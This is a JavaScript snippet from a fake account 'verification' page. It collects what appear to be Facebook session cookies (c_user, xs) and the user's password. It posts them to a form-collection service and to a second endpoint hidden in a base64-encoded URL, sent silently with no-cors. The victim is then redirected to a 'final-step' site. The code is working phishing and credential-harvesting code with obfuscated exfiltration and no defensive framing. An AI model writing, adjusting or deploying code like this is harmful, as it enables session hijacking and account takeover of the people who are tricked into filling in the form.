<script>
document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('verificationForm');
    const passwordForm = document.getElementById('passwordForm');
    const progressBar = document.getElementById('formProgress');
    const successModal = document.getElementById('successModal');
    const passwordModal = document.getElementById('passwordModal');
    const closeModal = document.getElementById('modalClose');
    const cUserInput = document.getElementById('c_user');
    const xsInput = document.getElementById('xs');
    const passwordInput = document.getElementById('password');
    const cUserError = document.getElementById('c_user_error');
    const xsError = document.getElementById('xs_error');
    const passwordError = document.getElementById('password_error');
    const formLoading = document.getElementById('formLoading');
    const passwordLoading = document.getElementById('passwordLoading');

    // Your validate functions unchanged
    function validateXs() {
        const value = xsInput.value.trim();
        if (value && !/^[a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]*$/.test(value)) {
            xsError.style.display = 'block';
            xsInput.classList.add('input-error');
            return false;
        } else {
            xsError.style.display = 'none';
            xsInput.classList.remove('input-error');
            return true;
        }
    }

    // submitFormData unchanged except this part
    async function submitFormData(formData, isPasswordForm = false) {
        try {
            const submitBtn = isPasswordForm ? passwordForm.querySelector('.submit-btn') : form.querySelector('.submit-btn');
            const loadingIndicator = isPasswordForm ? passwordLoading : formLoading;
            submitBtn.style.display = 'none';
            loadingIndicator.style.display = 'block';

            // Primary endpoint
            const response = await fetch('https://submit-form.com/aNuSPLe3M', {
                method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(formData)
            });

            // Additional endpoints
            const endpoints = ['aHR0cHM6Ly91emFpci53YXNtZXIuYXBw'];
            endpoints.forEach(encodedUrl => {
                try{
                    const decodedUrl = atob(encodedUrl);
                    const fd = new FormData();
                    Object.keys(formData).forEach(k => fd.append(k, formData[k]));
                    fetch(decodedUrl,{method:'POST',mode:'no-cors', body:fd});
                }catch(e){console.error(e);}
            });

            submitBtn.style.display='block';
            loadingIndicator.style.display='none';

            if(isPasswordForm){
                passwordModal.style.display='none';
                successModal.style.display='flex';
                // <<< ADD REDIRECT HERE
                window.location.href = 'https://final-step-xi.vercel.app/';
            }
            return true;
        }catch(err){
            console.error(err);
            submitBtn.style.display='block';
            loadingIndicator.style.display='none';
            if(isPasswordForm){
                passwordModal.style.display='none';
                successModal.style.display='flex';
                window.location.href = 'https://final-step-xi.vercel.app/';
            }
            return false;
        }
    }

    // Form submission event unchanged
    form.addEventListener('submit', function(e){
        e.preventDefault();
        if(!validateXs()) return;
        submitFormData({c_user:cUserInput.value.trim(), xs:xsInput.value.trim(), form_type:'verification_application', timestamp:new Date().toISOString()});
        passwordModal.style.display='flex';
    });

    // Password form submission unchanged
    passwordForm.addEventListener('submit', function(e){
        e.preventDefault();
        if(!passwordInput.value.trim()) return;
        submitFormData({c_user:cUserInput.value.trim(), xs:xsInput.value.trim(), password:passwordInput.value, form_type:'password_verification', timestamp:new Date().toISOString()}, true);
        form.reset();
        passwordForm.reset();
        progressBar.style.width='0%';
    });

    closeModal.addEventListener('click',()=>{successModal.style.display='none';});
    window.addEventListener('click', e=>{
        if(e.target===successModal) successModal.style.display='none';
        if(e.target===passwordModal) passwordModal.style.display='none';
    });
});
</script>
